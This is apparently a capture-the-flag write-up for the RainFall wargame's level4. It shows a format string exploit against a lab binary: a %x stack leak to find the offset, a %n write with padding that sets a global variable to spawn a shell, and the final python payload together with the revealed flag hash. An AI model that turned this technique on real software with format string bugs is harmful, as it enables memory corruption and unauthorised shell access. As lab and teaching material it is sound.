The binary reads user input, prints it with printf, and checks if the global variable m (at address 0x08049810) has a specific value (0x1025544 or 16930116 in decimal). If so, it spawns a shell.

We’ll use a format string vulnerability to write that value into the memory address of m.

1. Leak the stack with %x
To exploit the format string, we need to know where our input lands on the stack. We use %x to leak stack values and look for where our input string appears:

```
level4@RainFall:~$ python -c 'print "aaaa " + " %x" * 15' > /tmp/exploit
level4@RainFall:~$ cat /tmp/exploit | ./level4
aaaa b7ff26b0 bffff744 b7fd0ff4 0 0 bffff708 804848d bffff500 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078
We see 61616161 in the output — that's 'aaaa' in hex. It appears at the 12th position on the stack.
```

2. Understanding %n
printf()'s %n writes the number of bytes printed so far to the memory address provided as an argument.

We'll insert the address of m (0x08049810) into our input, then use a format string like %<number>d%12$n to print <number> bytes, causing the value <number> to be written to m.

3. Use %<number>d to pad the output
We want to write 16930116 (0x01025544) into the memory address 0x08049810.

We can use %16930116d to pad the output to 16930116 characters, then use %12$n to write that value to the address.

But we already wrote 4 bytes to insert the address of m at the beginning of the input — so we subtract 4: 16930116 - 4 = 16930112

4. Final payload

```
python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/exploit
cat /tmp/exploit | ./level4
.....
                     -1208015184
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a

```